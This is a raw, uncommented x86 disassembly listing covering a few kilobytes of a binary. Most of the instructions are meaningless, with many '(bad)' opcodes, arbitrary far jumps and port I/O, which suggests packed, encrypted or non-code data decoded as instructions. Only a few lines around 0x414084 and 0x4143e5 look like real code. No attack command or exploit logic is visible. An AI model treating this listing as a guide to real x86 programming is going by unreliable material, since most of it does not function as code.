  413f38:	cmp    bh,BYTE PTR [esi]
  413f3a:	test   BYTE PTR [edi-0xb],bl
  413f3d:	and    bh,BYTE PTR [ebp-0x5d]
  413f40:	add    al,0x34
  413f42:	push   es
  413f43:	xor    BYTE PTR [edi-0x3205dedc],dh
  413f49:	xor    al,0x5f
  413f4b:	mov    ch,BYTE PTR [edi-0x29]
  413f4e:	ds loopne 0x413eea
  413f51:	in     eax,dx
  413f52:	imul   ebp,DWORD PTR [ebx-0x77],0xb
  413f56:	pushf  
  413f57:	scas   eax,DWORD PTR es:[edi]
  413f58:	jbe    0x413f81
  413f5a:	int    0x2f
  413f5c:	xchg   DWORD PTR [ecx],esp
  413f5e:	xchg   ebp,eax
  413f5f:	shl    DWORD PTR [edx+0x1a8d331b],cl
  413f65:	fistp  WORD PTR [esi]
  413f67:	repnz stc 
  413f69:	push   0x383694de
  413f6e:	popf   
  413f6f:	scas   al,BYTE PTR es:[edi]
  413f70:	inc    ebx
  413f71:	out    dx,eax
  413f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f74:	mov    bl,0xda
  413f76:	ror    BYTE PTR [esi],1
  413f78:	retf   0x13f8
  413f7b:	or     eax,0xdac6c7bf
  413f80:	cmp    bh,BYTE PTR [edi]
  413f82:	shr    BYTE PTR [esi-0xf],cl
  413f85:	iret   
  413f86:	mov    edi,DWORD PTR [edx+0x238958a]
  413f8c:	outs   dx,BYTE PTR ds:[esi]
  413f8d:	xchg   esp,eax
  413f8e:	pop    edi
  413f8f:	mov    bh,0x8c
  413f91:	or     al,0x8f
  413f93:	sub    ch,BYTE PTR [esi-0x78]
  413f96:	adc    eax,0x7a25daf
  413f9b:	ret    0x1de2
  413f9e:	dec    ebp
  413f9f:	repz xchg ebx,eax
  413fa1:	int3   
  413fa2:	test   al,0x60
  413fa4:	cld    
  413fa5:	add    esp,DWORD PTR [ebx-0x468ce910]
  413fab:	mov    ebp,0xe5f0f404
  413fb0:	(bad)  
  413fb1:	mov    eax,0x8a7e1136
  413fb6:	rcr    BYTE PTR [ebx],0xdb
  413fb9:	sub    al,0x8c
  413fbb:	rcl    BYTE PTR [eax-0x2053ae1],0x54
  413fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fc3:	push   esi
  413fc4:	(bad)
  413fc8:	aad    0xaa
  413fca:	test   eax,0xf0f14b92
  413fcf:	fdiv   st(2),st
  413fd1:	or     al,0x3f
  413fd3:	pop    ebx
  413fd4:	push   esi
  413fd5:	cdq    
  413fd6:	sub    edx,esi
  413fd8:	loopne 0x414042
  413fda:	or     eax,0xb764ed93
  413fdf:	push   esp
  413fe0:	push   ds
  413fe1:	sub    bl,BYTE PTR ds:0x288a9278
  413fe7:	(bad)  
  413fe8:	or     al,0x82
  413fea:	cli    
  413feb:	fcmovu st,st(1)
  413fed:	push   edx
  413fee:	aaa    
  413fef:	pop    esp
  413ff0:	(bad)  
  413ff2:	add    DWORD PTR [ebx],ebp
  413ff4:	jno    0x413fae
  413ff6:	push   esp
  413ff7:	mov    DWORD PTR [edi+0x2e],esi
  413ffa:	out    dx,eax
  413ffb:	push   ss
  413ffc:	inc    eax
  413ffd:	xchg   edi,eax
  413ffe:	data16 aam 0x5
  414001:	out    0x63,al
  414003:	gs into 
  414005:	pop    DWORD PTR [edx-0xadf7284]
  41400b:	cmp    DWORD PTR ds:0xe119d8a6,edi
  414011:	vmwrite esi,esi
  414014:	js     0x414083
  414016:	pusha  
  414017:	outs   dx,BYTE PTR ds:[esi]
  414018:	pusha  
  414019:	repnz (bad) 
  41401b:	or     edi,DWORD PTR [esi+0x4b3646d0]
  414021:	xchg   BYTE PTR [esi-0x37],bh
  414024:	or     ebx,eax
  414026:	adc    edi,DWORD PTR [ebp+0x722bca4b]
  41402c:	not    BYTE PTR [ecx+0x55]
  41402f:	neg    ebx
  414031:	aas    
  414032:	jno    0x414053
  414034:	cmp    BYTE PTR [ebx-0x9],0x17
  414038:	ret    
  414039:	pop    esi
  41403a:	sar    BYTE PTR [ebx+0x1cc75ef8],1
  414040:	mov    dl,0xf3
  414042:	push   ebx
  414043:	dec    esi
  414044:	mov    ds:0x97963c60,al
  414049:	jb     0x41408f
  41404b:	in     eax,0x9a
  41404d:	fcomp  DWORD PTR es:[ecx+0x2f542da3]
  414054:	sub    DWORD PTR [ecx+0x63],ebp
  414057:	pop    edi
  414058:	retf   
  414059:	adc    eax,0x4136b1af
  41405e:	cdq    
  41405f:	mov    WORD PTR [edi+0x27b728e5],gs
  414065:	loop   0x4140aa
  414067:	add    esi,esp
  414069:	jae    0x4140dd
  41406b:	cmp    esp,DWORD PTR [esp+eiz*4]
  41406e:	xor    eax,0xb89e3c80
  414073:	cmp    al,0xb8
  414075:	adc    al,0x89
  414077:	enter  0x8bab,0x4d
  41407b:	adc    BYTE PTR [ebx-0x2dccebab],cl
  414081:	shl    ecx,0x1e
  414084:	mov    ecx,DWORD PTR [ebp+0x10]
  414087:	xor    eax,esi
  414089:	or     eax,edx
  41408b:	mov    edx,DWORD PTR [ebp+0x14]
  41408e:	shrd   ecx,edx,0x2
  414092:	shr    edx,0x2
  414095:	mov    edx,DWORD PTR [ebp+0x10]
  414098:	mov    ebx,DWORD PTR [ebp+0x14]
  41409b:	xor    ecx,esi
  41409d:	xor    ebx,ebx
  41409f:	or     ecx,ebx
  4140a1:	shl    edx,0x1e
  4140a4:	jmp    0x4143dd
  4140a9:	pop    eax
  4140aa:	add    eax,0xb29872c6
  4140af:	jl     0x4140dc
  4140b1:	fisttp DWORD PTR [ecx+0x6f5aa486]
  4140b7:	or     dl,BYTE PTR [edx-0x41416db5]
  4140bd:	in     eax,dx
  4140be:	les    edi,FWORD PTR [esi-0x3511842]
  4140c4:	fdivr  QWORD PTR [esp+edi*2]
  4140c7:	sub    BYTE PTR [ecx+0x25],bl
  4140ca:	out    dx,al
  4140cb:	bound  ebx,QWORD PTR [ecx-0x4]
  4140ce:	loope  0x414116
  4140d0:	xchg   ebx,eax
  4140d1:	aaa    
  4140d2:	add    eax,0x1308792e
  4140d7:	push   ss
  4140d8:	test   DWORD PTR [ebp-0x211db872],ebp
  4140de:	sbb    DWORD PTR [edx+ebx*1-0x53e6326e],ecx
  4140e5:	loop   0x4140b1
  4140e7:	popf   
  4140e8:	out    dx,al
  4140e9:	mov    cl,ah
  4140eb:	lock sbb bh,bl
  4140ee:	cmc    
  4140ef:	mov    cl,0xb9
  4140f1:	das    
  4140f2:	jno    0x41409f
  4140f4:	inc    ebx
  4140f5:	cmp    ebx,ecx
  4140f7:	add    esp,DWORD PTR [edx]
  4140f9:	call   0x7e52fdb6
  4140fe:	mov    ah,0xcc
  414100:	adc    DWORD PTR [eax+0x4ff5a35d],edi
  414106:	xchg   esp,eax
  414107:	push   ds
  414108:	pcmpgtd mm1,QWORD PTR [edi+0x2c]
  41410c:	ret    
  41410d:	jge    0x4140dc
  41410f:	imul   esi,DWORD PTR [ebx-0x76],0xe1a5d6c2
  414116:	lock imul ebx,DWORD PTR [eax-0x1b],0xec718c1e
  41411e:	scas   eax,DWORD PTR es:[edi]
  41411f:	and    ebx,DWORD PTR [edi+0x11095a29]
  414125:	ret    0x986a
  414128:	fstp   QWORD PTR [ebx-0x37]
  41412b:	jb     0x4141a4
  41412d:	cmp    dh,BYTE PTR [esi]
  41412f:	aas    
  414130:	jl     0x4140f6
  414132:	test   al,0x91
  414134:	sbb    eax,0x33a701ee
  414139:	xlat   BYTE PTR ds:[ebx]
  41413a:	iret   
  41413b:	xor    al,0x4b
  41413d:	and    eax,0xe7d33bb0
  414142:	and    DWORD PTR [eax+eiz*1-0x364c0e49],esi
  414149:	push   ecx
  41414a:	mov    ds:0x39f03f47,eax
  41414f:	add    edi,DWORD PTR ds:[esi+eiz*2]
  414153:	push   ebx
  414154:	dec    edx
  414155:	add    BYTE PTR [ebp-0x1fbe0762],0x9e
  41415c:	or     DWORD PTR [edx-0x27],edi
  41415f:	arpl   WORD PTR [edi-0x1ae1af],sp
  414165:	(bad)  
  414166:	mov    ebp,0x395d23cd
  41416b:	mov    ch,0xeb
  41416d:	rcl    dh,0x73
  414170:	stos   BYTE PTR es:[edi],al
  414171:	mov    eax,0x46e0dd58
  414176:	dec    edi
  414177:	int3   
  414178:	add    DWORD PTR [eax-0x74bab522],esi
  41417e:	add    al,0xc0
  414180:	sub    al,0x7b
  414182:	pop    esp
  414183:	mov    bl,0x35
  414185:	icebp  
  414186:	cdq    
  414187:	xchg   ebp,eax
  414188:	xchg   esi,eax
  414189:	icebp  
  41418a:	pop    eax
  41418b:	jno    0x4141ab
  41418d:	js     0x41415b
  41418f:	jno    0x41418e
  414191:	push   ds
  414192:	add    al,0x4f
  414194:	xchg   esi,eax
  414195:	cmp    esi,ecx
  414197:	lods   eax,DWORD PTR ds:[esi]
  414198:	dec    edx
  414199:	push   ds
  41419a:	pop    ebx
  41419b:	retf   
  41419c:	dec    esi
  41419d:	pop    esi
  41419e:	dec    ecx
  41419f:	aad    0x9c
  4141a1:	inc    eax
  4141a2:	push   0xfffffff7
  4141a4:	loop   0x414172
  4141a6:	cmp    edi,DWORD PTR [edx*1+0x12277c94]
  4141ad:	mov    esp,0x615dec4d
  4141b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141b3:	and    edx,edx
  4141b5:	mov    ah,0x1d
  4141b7:	aaa    
  4141b8:	cdq    
  4141b9:	leave  
  4141ba:	mov    ebx,0x7669e74a
  4141bf:	popf   
  4141c0:	pop    eax
  4141c1:	retf   0x1c2c
  4141c4:	lahf   
  4141c5:	popa   
  4141c6:	fidivr DWORD PTR [edx]
  4141c8:	(bad)  
  4141ca:	aad    0xa7
  4141cc:	scas   eax,DWORD PTR es:[edi]
  4141cd:	mov    al,0x0
  4141cf:	out    dx,al
  4141d0:	jne    0x41420d
  4141d2:	jmp    FWORD PTR [eax-0x74ca4879]
  4141d8:	call   0xd9f8:0xdf2d4d30
  4141df:	jmp    0x41418a
  4141e1:	lahf   
  4141e2:	fnstenv [edx-0x40]
  4141e5:	ficom  WORD PTR [eax+0x1f43dc9f]
  4141eb:	imul   ebx,DWORD PTR ds:0x4806cba,0xfffffff7
  4141f2:	push   eax
  4141f3:	dec    edx
  4141f4:	or     eax,0xd3eb4810
  4141f9:	in     eax,0x15
  4141fb:	mov    eax,0x972f04a5
  414200:	xor    al,0xb4
  414202:	pop    esi
  414203:	inc    edx
  414204:	mov    eax,ds:0x41d5c7a0
  414209:	sbb    BYTE PTR [ebx+edi*2],ah
  41420c:	outs   dx,BYTE PTR ds:[esi]
  41420d:	and    al,0xdb
  41420f:	adc    ch,BYTE PTR [eax-0x70]
  414212:	xor    BYTE PTR [esp+edx*1-0x7f],al
  414216:	cmp    ebx,DWORD PTR [ecx-0x1a]
  414219:	mov    ecx,0xf649d121
  41421e:	dec    eax
  41421f:	pop    ds
  414220:	xlat   BYTE PTR ds:[ebx]
  414221:	add    BYTE PTR [eax-0x6e8616a6],dl
  414227:	icebp  
  414228:	in     al,0x43
  41422a:	dec    esp
  41422b:	jo     0x41426f
  41422d:	and    eax,0xab323f20
  414232:	aad    0x31
  414234:	inc    ebx
  414235:	(bad)  
  414236:	jnp    0x4141ba
  414238:	xlat   BYTE PTR ds:[ebx]
  414239:	mov    esp,0x728a21a3
  41423e:	shl    DWORD PTR [edx-0x15],1
  414241:	add    esp,ebx
  414243:	dec    esi
  414244:	sub    edi,esp
  414246:	push   ds
  414247:	rol    BYTE PTR [edi],cl
  414249:	leave  
  41424a:	ret    
  41424b:	loopne 0x4141cf
  41424d:	ja     0x41425c
  41424f:	inc    ebp
  414250:	adc    al,0xbf
  414252:	fldcw  WORD PTR [edx-0x65]
  414255:	cmp    eax,0x2be43b0
  41425a:	adc    DWORD PTR [eax-0x4f],edx
  41425d:	retf   0x8870
  414260:	(bad)  
  414261:	mov    bh,0x9d
  414263:	icebp  
  414264:	mov    BYTE PTR [eax+0x60578ad6],ah
  41426a:	lds    esp,FWORD PTR [eax+edx*2]
  41426d:	push   ebx
  41426e:	pop    eax
  41426f:	sbb    bl,bl
  414271:	mov    dh,0x9
  414273:	or     DWORD PTR [ecx],0x76
  414276:	jb     0x414248
  414278:	cmp    edi,0xffffff9b
  41427b:	mov    ecx,0xc10dab3e
  414280:	xor    eax,ebx
  414282:	lar    ecx,WORD PTR [eax+0x2d]
  414286:	test   DWORD PTR [eax-0x7a647c1e],esp
  41428c:	mov    edx,0xdaedfab2
  414291:	sub    al,0x20
  414293:	and    dh,BYTE PTR [edi]
  414295:	xchg   esi,eax
  414296:	pop    ebx
  414297:	(bad)  
  414298:	cli    
  414299:	ss xchg ebp,eax
  41429b:	mov    ch,0x69
  41429d:	popf   
  41429e:	sbb    esi,DWORD PTR ds:0xcd0b71ef
  4142a4:	pop    ss
  4142a5:	aam    0x65
  4142a7:	ins    DWORD PTR es:[edi],dx
  4142a8:	push   ebp
  4142a9:	mov    ah,0x30
  4142ab:	(bad)  
  4142ac:	es dec edx
  4142ae:	mov    ebp,ss
  4142b0:	or     ebx,DWORD PTR ds:0xf1be1135
  4142b6:	or     esi,esp
  4142b8:	xor    BYTE PTR ds:0x9abdf8a9,bl
  4142be:	cmp    ch,BYTE PTR [ecx+ebx*1+0x752c6001]
  4142c5:	in     eax,dx
  4142c6:	pop    ecx
  4142c7:	mov    dh,0x13
  4142c9:	dec    edx
  4142ca:	jae    0x4142f2
  4142cc:	push   ds
  4142cd:	div    BYTE PTR ds:0x9275cee2
  4142d3:	popa   
  4142d4:	adc    eax,0x2c67ee5d
  4142d9:	xlat   BYTE PTR ds:[ebx]
  4142da:	and    DWORD PTR [eax+0x2c],0x7a71a388
  4142e1:	(bad)  
  4142e2:	sub    eax,0xaafa2a7c
  4142e7:	ja     0x4142de
  4142e9:	hlt    
  4142ea:	retf   0x6df6
  4142ed:	jecxz  0x414350
  4142ef:	pop    ds
  4142f0:	jge    0x4142bd
  4142f2:	pop    ebx
  4142f3:	pop    DWORD PTR [edx]
  4142f5:	pop    esp
  4142f6:	inc    edx
  4142f7:	cmp    eax,0x57725917
  4142fc:	adc    edi,DWORD PTR [edx]
  4142fe:	mov    eax,0xdc5f74b6
  414303:	outs   dx,DWORD PTR ds:[esi]
  414304:	add    eax,0x159bad1e
  414309:	sbb    cl,al
  41430b:	bound  ebp,QWORD PTR [ebx-0x45]
  41430e:	sbb    al,0x74
  414310:	retf   
  414311:	cmp    esp,DWORD PTR [edi-0x1ee62148]
  414317:	sub    cl,BYTE PTR [edi+esi*1+0x1d40be28]
  41431e:	data16 aaa 
  414320:	jmp    0x4142ad
  414322:	jmp    0xa3e4fc24
  414327:	jecxz  0x41437e
  414329:	and    eax,0x6f8924ad
  41432e:	pushf  
  41432f:	cmp    BYTE PTR gs:[ebx+esi*2+0x16],dh
  414334:	and    BYTE PTR [ecx-0x44],bh
  414337:	or     BYTE PTR [ecx-0x28],0x55
  41433b:	loop   0x414365
  41433d:	sub    DWORD PTR [edx],0x50889bef
  414343:	sub    ch,cl
  414345:	xchg   ecx,eax
  414346:	mov    ebp,0x39e377e0
  41434b:	(bad)  
  41434c:	rcr    DWORD PTR [edx-0x10],cl
  41434f:	rcl    DWORD PTR [esi+0x66148da1],cl
  414355:	or     ch,BYTE PTR [ebx]
  414357:	jnp    0x414391
  414359:	or     DWORD PTR [ecx-0xf],0x81cba8ce
  414360:	out    dx,al
  414361:	sbb    dh,BYTE PTR [eax-0x4b]
  414364:	cli    
  414365:	cmp    al,0x1f
  414367:	std    
  414368:	fs or  eax,0xd67efef7
  41436e:	cmp    bl,BYTE PTR [edx-0x4b]
  414371:	pop    ebp
  414372:	adc    al,0xe
  414374:	sti    
  414375:	inc    edx
  414376:	jmp    0x4c2fb08f
  41437b:	inc    edi
  41437c:	rcl    bh,cl
  41437e:	popf   
  41437f:	and    al,0xca
  414381:	adc    BYTE PTR [ebp+0x3c],cl
  414384:	scas   eax,DWORD PTR es:[edi]
  414385:	fnstcw WORD PTR [edi+edi*2+0x12]
  414389:	les    edx,FWORD PTR [ecx-0x2d8aebc7]
  41438f:	cmc    
  414390:	xchg   edx,eax
  414391:	inc    edx
  414392:	in     eax,0x99
  414394:	out    0xc5,al
  414396:	(bad)  
  414397:	pusha  
  414398:	les    esi,FWORD PTR [edi+0x2c]
  41439b:	jnp    0x41438b
  41439d:	xor    ecx,edi
  41439f:	enter  0xb22f,0xfe
  4143a3:	and    BYTE PTR [esi-0x8],bl
  4143a6:	jle    0x41438c
  4143a8:	or     al,0x31
  4143aa:	cmp    DWORD PTR [ecx-0x71],edi
  4143ad:	ds xchg esp,eax
  4143af:	arpl   WORD PTR [ecx+0x750afed4],bp
  4143b5:	adc    esp,DWORD PTR [edx-0x7aee5b91]
  4143bb:	test   al,0xef
  4143bd:	aaa    
  4143be:	cmc    
  4143bf:	call   0x43f4:0x3f3698e8
  4143c6:	leave  
  4143c7:	jle    0x414401
  4143c9:	in     al,dx
  4143ca:	pop    esp
  4143cb:	in     al,0x68
  4143cd:	jp     0x414376
  4143cf:	cmp    edi,DWORD PTR [edi]
  4143d1:	gs cdq 
  4143d3:	push   eax
  4143d4:	imul   DWORD PTR [ebx+0x5dc63bad]
  4143da:	mov    bl,0x5e
  4143dc:	add    BYTE PTR [ebx],al
  4143de:	ror    DWORD PTR [ebx+0x558b104d],0x14
  4143e5:	shrd   ecx,edx,0x2
  4143e9:	shr    edx,0x2
  4143ec:	xor    ecx,esi
  4143ee:	jmp    0x414727
  4143f3:	cmp    eax,0xb8c710f5
  4143f8:	sub    BYTE PTR [ebp+0x76acc878],dl
  4143fe:	xchg   edx,eax
  4143ff:	mov    ecx,0x7bdd422c
  414404:	cwde   
  414405:	mov    esi,0xbec4edbe
  41440a:	mov    esi,0x8ad64165
  41440f:	adc    esp,DWORD PTR [ebp-0x70]
  414412:	push   ds
  414413:	dec    esi
  414414:	jle    0x41444d
  414416:	fdivr  DWORD PTR ds:0xa137ae2a
  41441c:	add    ch,BYTE PTR [ecx-0x32]
  41441f:	mov    al,ds:0xedd7f6e4
  414424:	(bad)  
  414426:	adc    ebx,ebp
  414428:	pop    ds
  414429:	add    al,0x76
  41442b:	hlt    
  41442c:	push   0xd5b23f1a
  414431:	add    DWORD PTR [ebp-0x465ae7ad],edi
  414437:	mov    ecx,0x91fc72a3
  41443c:	jge    0x4144b4
  41443e:	fiadd  DWORD PTR [eax-0x3db48696]
  414444:	rcl    BYTE PTR [ecx],0xb3
  414447:	dec    ebx
  414448:	fsubr  DWORD PTR [ebp+0x2719ac7d]
  41444e:	inc    eax
  41444f:	lods   al,BYTE PTR ds:[esi]
  414450:	cmc    
  414451:	and    eax,0x8bc9665
  414456:	test   DWORD PTR [ebp-0x2e5eca1d],esi
  41445c:	lds    ecx,FWORD PTR [edx+edi*8+0x61]
  414460:	jmp    0x1b03904a
  414465:	out    dx,al
  414466:	fcom   DWORD PTR [edi+0x10]
  414469:	sahf   
  41446a:	retf   
  41446b:	xor    al,0x93
  41446d:	inc    ecx
  41446e:	push   ecx
  41446f:	(bad)  
  414470:	iret   
  414471:	sub    edi,edx
  414473:	mov    es,WORD PTR [ebp-0x7d]
  414476:	out    0x6c,eax
  414478:	test   DWORD PTR [esi+ebp*2],0x552d807c
  41447f:	lods   eax,DWORD PTR ds:[esi]
  414480:	stc    
  414481:	and    al,0xb6
  414483:	pop    esp
  414484:	sub    dl,BYTE PTR [edx+0x26b83ac2]
  41448a:	pop    es
  41448b:	pop    ds
  41448c:	fld    st(0)
  41448e:	imul   BYTE PTR [ecx]
  414490:	repnz mov ecx,0xa457f027
  414496:	in     eax,dx
  414497:	pusha  
  414498:	mov    esp,0x58d33d8a
  41449d:	(bad)  
  41449e:	addr16 ret 
  4144a0:	and    DWORD PTR [ebx],edx
  4144a2:	pop    ss
  4144a3:	in     al,dx
  4144a4:	xor    eax,0x88f280
  4144a9:	test   BYTE PTR [eax*4+0x2ea1d06d],al
  4144b0:	ins    DWORD PTR es:[edi],dx
  4144b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144b2:	and    edx,edi
  4144b4:	fwait
  4144b5:	push   eax
  4144b6:	and    eax,0xd8c339e7
  4144bb:	xchg   ebx,eax
  4144bc:	arpl   WORD PTR [eax+0x3f],cx
  4144bf:	(bad)  
  4144c0:	js     0x4144bd
  4144c2:	shl    BYTE PTR [ecx],0x27
  4144c5:	jnp    0x41448a
  4144c7:	mov    eax,ds:0x4278eb0e
  4144cc:	or     esp,DWORD PTR [eax]
  4144ce:	loope  0x4144da
  4144d0:	pop    edx
  4144d1:	fild   QWORD PTR [edx]
  4144d3:	mov    ds:0xa3688ec9,eax
  4144d8:	ja     0x4144a9
  4144da:	mov    ch,0xcd
  4144dc:	jo     0x4144d4
  4144de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144df:	mov    esi,0x4805a58c
  4144e4:	xor    DWORD PTR [ebx-0x5f2d9a3e],edi
  4144ea:	xor    ah,BYTE PTR [eax+0x53bb164d]
  4144f0:	aas    
  4144f1:	sbb    BYTE PTR [esi],dl
  4144f3:	sbb    eax,0x7bcb2e7e
  4144f8:	stos   BYTE PTR es:[edi],al
  4144f9:	ins    BYTE PTR es:[edi],dx
  4144fa:	push   cs
  4144fb:	stos   BYTE PTR es:[edi],al
  4144fc:	pop    edx
  4144fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144fe:	test   al,0x4
  414500:	mov    bl,0x0
  414502:	sub    dl,ch
  414504:	in     al,0xaa
  414506:	jmp    0xc7a5:0xaeb4edd
  41450d:	mov    bl,0x3b
  41450f:	xchg   esi,eax
  414510:	fmul   st(5),st
  414512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414513:	pop    ds
  414514:	push   ss
  414515:	in     eax,dx
  414516:	or     al,0x2b
  414518:	leave  
  414519:	jne    0x41449d
  41451b:	(bad)  
  41451c:	out    0x42,al
  41451e:	xchg   BYTE PTR [eax],cl
  414520:	(bad)  
  414521:	out    0x31,al
  414523:	out    dx,al
  414524:	(bad)
  414528:	jle    0x4145a4
  41452a:	fld    DWORD PTR [ebx+edx*2]
  41452d:	out    dx,eax
  41452e:	(bad)  
  41452f:	sbb    al,BYTE PTR [ecx+0x25]
  414532:	adc    BYTE PTR [edx+0x7c6983f8],bh
  414538:	jb     0x4144c6
  41453a:	add    eax,0x737d6050
  41453f:	dec    edx
  414540:	mov    ebp,DWORD PTR [ebx-0x65]
  414543:	xchg   ebp,eax
  414544:	cld    
  414545:	iret   
  414546:	popa   
  414547:	fdiv   QWORD PTR ds:0x54f63d25
  41454d:	clc    
  41454e:	loopne 0x4145c9
  414550:	stc    
  414551:	aam    0xcc
  414553:	jae    0x414564
  414555:	ret    0x2e2a
  414558:	lods   eax,DWORD PTR ds:[esi]
  414559:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41455b:	add    DWORD PTR [edx-0x73],0x168c591c
  414562:	xor    ebx,esi
  414564:	into   
  414565:	sahf   
  414566:	and    DWORD PTR [esi+0x7a],ecx
  414569:	mov    al,0x79
  41456b:	or     ch,BYTE PTR [esi-0x2d]
  41456e:	jae    0x41450e
  414570:	inc    edx
  414571:	ret    0x4bbb
  414574:	xlat   BYTE PTR ds:[ebx]
  414575:	or     DWORD PTR [ebp+0x53c88a87],eax
  41457b:	addr16 push ebx
  41457d:	push   eax
  41457e:	pop    ecx
  41457f:	pop    esp
  414580:	test   al,0x3
  414582:	(bad)  
  414583:	mov    cl,0xa3
  414585:	xor    esi,DWORD PTR [ebp+eax*4-0x76]
  414589:	(bad)  
  41458a:	lds    edx,FWORD PTR [edx-0x18]
  41458d:	pop    ebp
  41458e:	inc    esp
  41458f:	shr    DWORD PTR [edx],0x85
  414592:	maxps  xmm3,XMMWORD PTR [edi+0x17]
  414596:	sub    edi,eax
  414598:	aad    0x2b
  41459a:	xchg   edi,edi
  41459c:	mov    dl,0xe
  41459e:	mov    esi,0x3af67e8d
  4145a3:	mov    WORD PTR [edx],gs
  4145a5:	in     eax,0x1e
  4145a7:	aas    
  4145a8:	and    eax,0x8767172b
  4145ad:	pop    esp
  4145ae:	(bad)  
  4145af:	adc    DWORD PTR [ecx],edi
  4145b1:	mov    ch,0xd8
  4145b3:	adc    bh,BYTE PTR [ebx+ebp*8]
  4145b6:	ud1    ecx,DWORD PTR [edx+0x1515a8c5]
  4145bd:	scas   eax,DWORD PTR es:[edi]
  4145be:	test   ch,0x87
  4145c1:	mov    dl,0x40
  4145c3:	das    
  4145c4:	shl    bl,cl
  4145c6:	xchg   esi,eax
  4145c7:	test   DWORD PTR ds:0xdc7c27e0,esp
  4145cd:	and    cl,al
  4145cf:	cmp    DWORD PTR [eax-0x77230c],edx
  4145d5:	pop    esp
  4145d6:	cld    
  4145d7:	mov    al,0xcc
  4145d9:	push   esi
  4145da:	scas   eax,DWORD PTR es:[edi]
  4145db:	cmp    ebx,DWORD PTR [ecx-0x3be8b7d0]
  4145e1:	xchg   edx,eax
  4145e2:	sub    eax,0x158064df
  4145e7:	(bad)  
  4145e8:	sub    al,0xd8
  4145ea:	add    cl,BYTE PTR [eax+0x30549e09]
  4145f0:	mul    DWORD PTR [eax]
  4145f2:	leave  
  4145f3:	fldcw  WORD PTR [edi]
  4145f5:	pop    edx
  4145f6:	imul   eax,DWORD PTR [edi-0x45],0xffffffcd
  4145fa:	sbb    DWORD PTR [ecx-0x38],0x5
  4145fe:	jl     0x414607
  414600:	or     edi,DWORD PTR [esi]
  414602:	and    eax,0xd93a764d
  414607:	adc    bh,cl
  414609:	shr    BYTE PTR [edi+0x15011088],0xaa
  414610:	ret    
  414611:	mov    edi,0x5d938d5e
  414616:	push   cs
  414617:	pusha  
  414618:	mov    ecx,0x9e0559e7
  41461d:	sbb    BYTE PTR [eax+0x5ba56f9c],0x76
  414624:	sub    DWORD PTR [ecx],esp
  414626:	cmp    al,0x99
  414628:	cdq    
  414629:	call   0x5ea7:0x6827caae
  414630:	sub    esi,DWORD PTR [ebx-0xd]
  414633:	add    DWORD PTR [ecx+0x2656d814],esi
  414639:	(bad)  
  41463a:	dec    esi
  41463b:	int3   
  41463c:	div    bh
  41463e:	pop    ecx
  41463f:	add    eax,0x9877a5e2
  414644:	rol    bl,1
  414646:	call   0xfaab:0x272c15c3
  41464d:	dec    eax
  41464e:	cmp    esp,edi
  414650:	sub    edx,DWORD PTR [ebx]
  414652:	push   0x5a
  414654:	adc    BYTE PTR [ebp-0x26],0x91
  414658:	xlat   BYTE PTR ds:[ebx]
  414659:	test   BYTE PTR [ebx],0x1
  41465c:	mov    al,ds:0xea128624
  414661:	loop   0x4145e8
  414663:	mov    BYTE PTR gs:[ebx-0x2b40def8],bh
  41466a:	push   esp
  41466b:	or     al,0x23
  41466d:	jge    0x4146d9
  41466f:	xchg   edi,eax
  414670:	loope  0x414652
  414672:	stos   DWORD PTR es:[edi],eax
  414673:	jbe    0x414625
  414675:	mov    esp,0x2c9ee2ae
  41467a:	adc    al,0x1e
  41467c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41467d:	loop   0x414675
  41467f:	ror    dh,cl
  414681:	xor    cl,BYTE PTR ds:0x838caf04
  414687:	add    BYTE PTR [eax],al
  414689:	or     DWORD PTR [ecx+ecx*4],ebx
  41468c:	bound  esp,QWORD PTR [eax]
  41468e:	or     eax,0x369a9c85
  414693:	jecxz  0x414705
  414695:	xlat   BYTE PTR ds:[ebx]
  414696:	add    ecx,DWORD PTR [edi+eax*4-0x74]
  41469a:	xchg   ecx,eax
  41469b:	call   0x430cbea9
  4146a0:	ds push 0x11
  4146a3:	out    dx,eax
  4146a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146a5:	test   eax,0xaa0425f8
  4146aa:	mov    WORD PTR [ebp-0x7d],cs
  4146ad:	fs inc esp
  4146af:	add    esi,eax
  4146b1:	inc    BYTE PTR [edx-0x2192fcfe]
  4146b7:	adc    eax,0xcaf91948
  4146bc:	jl     0x414674
  4146be:	jbe    0x414728
  4146c0:	jmp    0x41468d
  4146c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146c4:	hlt    
  4146c5:	das    
  4146c6:	adc    BYTE PTR [ecx+0x5c],0x12
  4146ca:	in     eax,0x42
  4146cc:	int    0x39
  4146ce:	xchg   ecx,eax
  4146cf:	dec    edx
  4146d0:	call   0x5b28d984
  4146d5:	pop    ecx
  4146d6:	(bad)  
  4146d7:	mov    al,ds:0x83f37b71
  4146dc:	xchg   dl,dh
  4146de:	push   edx
  4146df:	mov    bl,0xf2
  4146e1:	jbe    0x4146f5
  4146e3:	pop    es
  4146e4:	xchg   edx,eax
  4146e5:	pop    esp
  4146e6:	push   cs
  4146e7:	je     0x4146b2
  4146e9:	int3   
  4146ea:	out    dx,eax
  4146eb:	dec    ecx
  4146ec:	cmc    
  4146ed:	lea    edx,ds:0x60614364
  4146f3:	dec    esi
  4146f4:	jae    0x414710
  4146f6:	xlat   BYTE PTR ds:[ebx]
  4146f8:	cld    
  4146f9:	push   ss
  4146fa:	and    esp,DWORD PTR [esi+esi*1+0x40]
  4146fe:	pop    ebx
  4146ff:	arpl   di,di
  414701:	dec    ebx
  414702:	jo     0x414742
  414704:	xchg   edi,eax
  414705:	call   0xe36272fa
  41470a:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41470c:	mov    edi,0xf03db97c
  414711:	mov    al,BYTE PTR [ecx+ebx*8-0x340a6b34]
  414718:	(bad)  
  414719:	or     eax,0x6c27b7ac
